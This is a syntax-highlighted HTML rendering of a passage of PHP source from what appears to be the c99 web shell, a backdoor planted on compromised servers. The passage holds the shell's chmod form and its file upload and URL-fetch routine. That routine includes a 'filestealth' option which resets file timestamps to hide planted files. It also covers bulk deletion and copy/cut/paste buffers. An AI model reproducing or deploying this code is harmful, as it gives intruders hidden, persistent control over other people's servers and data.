   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Changing file-mode (&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;), &quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">decoct</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)),</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$err</span><span class="o">?</span><span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$err</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;input type=hidden name=d value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=f value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=chmod&amp;gt;&amp;lt;table align=left width=300 border=0 cellspacing=0 cellpadding=5&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_o[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Read&amp;lt;br&amp;gt;&amp;lt;input type=checkbox name=chmod_o[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Write&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_o[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;eXecute&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Group&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_g[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Read&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_g[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Write&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_g[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;eXecute&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;World&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_w[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Read&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_w[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;nbsp;Write&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_w[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt;eXecute&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=chmod_submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;upload&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$uploadmess</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
 <span class="nv">$uploadpath</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,DIRECTORY_SEPARATOR,</span><span class="si">$uploadpath</span><span class="s2">);</span>
<span class="s2"> if (empty(</span><span class="si">$uploadpath</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$uploadpath</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> elseif (substr(</span><span class="si">$uploadpath</span><span class="s2">,-1) != &quot;</span><span class="o">/</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$uploadpath</span> <span class="o">.=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (!empty(</span><span class="si">$submit</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  global </span><span class="si">$HTTP_POST_FILES</span><span class="s2">;</span>
<span class="s2">  </span><span class="si">$uploadfile</span><span class="s2"> = </span><span class="si">$HTTP_POST_FILES[&quot;uploadfile&quot;]</span><span class="s2">;</span>
<span class="s2">  if (!empty(</span><span class="si">$uploadfile[&quot;tmp_name&quot;]</span><span class="s2">))</span>
<span class="s2">  {</span>
<span class="s2">   if (empty(</span><span class="si">$uploadfilename</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   else </span><span class="si">{</span><span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$userfilename</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   if (!move_uploaded_file(</span><span class="si">$uploadfile[&quot;tmp_name&quot;]</span><span class="s2">,</span><span class="si">$uploadpath</span><span class="s2">.</span><span class="si">$destin</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;Error uploading file &quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; (can&#39;t copy </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  }</span>
<span class="s2">  elseif (!empty(</span><span class="si">$uploadurl</span><span class="s2">))</span>
<span class="s2">  {</span>
<span class="s2">   if (!empty(</span><span class="si">$uploadfilename</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$uploadfilename</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   else</span>
<span class="s2">   {</span>
<span class="s2">    </span><span class="si">$destin</span><span class="s2"> = explode(&quot;</span><span class="o">/</span><span class="s2">&quot;,</span><span class="si">$destin</span><span class="s2">);</span>
<span class="s2">    </span><span class="si">$destin</span><span class="s2"> = </span><span class="si">$destin[count($destin)-1]</span><span class="s2">;</span>
<span class="s2">    if (empty(</span><span class="si">$destin</span><span class="s2">))</span>
<span class="s2">    {</span>
<span class="s2">     </span><span class="si">$i</span><span class="s2"> = 0;</span>
<span class="s2">     </span><span class="si">$b</span><span class="s2"> = &quot;&quot;;</span>
<span class="s2">     while(file_exists(</span><span class="si">$uploadpath</span><span class="s2">.</span><span class="si">$destin</span><span class="s2">)) {if (</span><span class="si">$i</span><span class="s2"> &amp;gt; 0) </span><span class="si">{</span><span class="nv">$b</span> <span class="o">=</span> <span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="p">;</span><span class="si">}</span><span class="s2"> </span><span class="si">$destin</span><span class="s2"> = &quot;</span><span class="nx">index</span><span class="s2">&quot;.</span><span class="si">$b</span><span class="s2">.&quot;</span><span class="o">.</span><span class="nx">html</span><span class="s2">&quot;; </span><span class="si">$i</span><span class="s2">++;}}</span>
<span class="s2">   }</span>
<span class="s2">   if ((!eregi(&quot;</span><span class="nx">http</span><span class="o">://</span><span class="s2">&quot;,</span><span class="si">$uploadurl</span><span class="s2">)) and (!eregi(&quot;</span><span class="nx">https</span><span class="o">://</span><span class="s2">&quot;,</span><span class="si">$uploadurl</span><span class="s2">)) and (!eregi(&quot;</span><span class="nx">ftp</span><span class="o">://</span><span class="s2">&quot;,</span><span class="si">$uploadurl</span><span class="s2">))) {echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Incorect</span> <span class="nx">url</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
<span class="s2">   else</span>
<span class="s2">   {</span>
<span class="s2">    </span><span class="si">$st</span><span class="s2"> = getmicrotime();</span>
<span class="s2">    </span><span class="si">$content</span><span class="s2"> = @file_get_contents(</span><span class="si">$uploadurl</span><span class="s2">);</span>
<span class="s2">    </span><span class="si">$dt</span><span class="s2"> = round(getmicrotime()-</span><span class="si">$st</span><span class="s2">,4);</span>
<span class="s2">    if (!</span><span class="si">$content</span><span class="s2">) </span><span class="si">{</span><span class="nv">$uploadmess</span> <span class="o">.=</span>  <span class="s2">&quot;Can&#39;t download file!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">    else</span>
<span class="s2">    {</span>
<span class="s2">     if (</span><span class="si">$filestealth</span><span class="s2">) </span><span class="si">{</span><span class="nv">$stat</span> <span class="o">=</span> <span class="nb">stat</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">     </span><span class="si">$fp</span><span class="s2"> = fopen(</span><span class="si">$uploadpath</span><span class="s2">.</span><span class="si">$destin</span><span class="s2">,&quot;</span><span class="nx">w</span><span class="s2">&quot;);</span>
<span class="s2">     if (!</span><span class="si">$fp</span><span class="s2">) </span><span class="si">{</span><span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;Error writing to file &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$destin</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">     else</span>
<span class="s2">     {</span>
<span class="s2">      fwrite(</span><span class="si">$fp</span><span class="s2">,</span><span class="si">$content</span><span class="s2">,strlen(</span><span class="si">$content</span><span class="s2">));</span>
<span class="s2">      fclose(</span><span class="si">$fp</span><span class="s2">);</span>
<span class="s2">      if (</span><span class="si">$filestealth</span><span class="s2">) {touch(</span><span class="si">$uploadpath</span><span class="s2">.</span><span class="si">$destin</span><span class="s2">,</span><span class="si">$stat[9]</span><span class="s2">,</span><span class="si">$stat[8]</span><span class="s2">);}</span>
<span class="s2">     }</span>
<span class="s2">    }</span>
<span class="s2">   }</span>
<span class="s2">  }</span>
<span class="s2"> }</span>
<span class="s2"> if (</span><span class="si">$miniform</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$uploadmess</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">  </span><span class="si">$act</span><span class="s2"> = &quot;</span><span class="nx">ls</span><span class="s2">&quot;;</span>
<span class="s2"> }</span>
<span class="s2"> else</span>
<span class="s2"> {</span>
<span class="s2">  echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">File</span> <span class="nx">upload</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$uploadmess</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">enctype</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;multipart/form-data</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">upload</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span>
<span class="s2">Select file on your local computer: &amp;lt;input name=</span><span class="se">\&quot;</span><span class="s2">uploadfile</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="s2">file</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;or&amp;lt;br&amp;gt;</span>
<span class="s2">Input URL: &amp;lt;input name=</span><span class="se">\&quot;</span><span class="s2">uploadurl</span><span class="se">\&quot;</span><span class="s2"> type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$uploadurl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">70</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">Save this file dir: &amp;lt;input name=</span><span class="se">\&quot;</span><span class="s2">uploadpath</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">70</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dispd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">File-name (auto-fill): &amp;lt;input name=uploadfilename size=25&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=checkbox name=uploadautoname value=1 id=df4&amp;gt;&amp;nbsp;convert file name to lovercase&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Upload</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;delete&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$delerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$actbox</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">fs_rmobj</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="nv">$delerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t delete &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$delerr</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Deleting with errors:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$delerr</span><span class="p">;}</span>
 <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$usefsbuff</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">((</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;paste&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cut&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;unselect&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Sorry, buffer is disabled. For enable, set directive </span><span class="se">\&quot;\$</span><span class="s2">useFSbuff</span><span class="se">\&quot;</span><span class="s2"> as TRUE.&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span> <span class="nx">c99_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="p">}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cut&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span> <span class="nx">c99_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;unselect&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}}</span> <span class="nx">c99_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$actemptybuff</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="nx">c99_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="nv">$actpastebuff</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="nv">$psterr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">fs_copy_obj</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$to</span><span class="p">))</span> <span class="p">{</span><span class="nv">$psterr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t copy &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; to &quot;</span><span class="o">.</span><span class="nv">$to</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$copy_unset</span><span class="p">)</span> <span class="p">{</span><span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);}</span>
  <span class="p">}</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
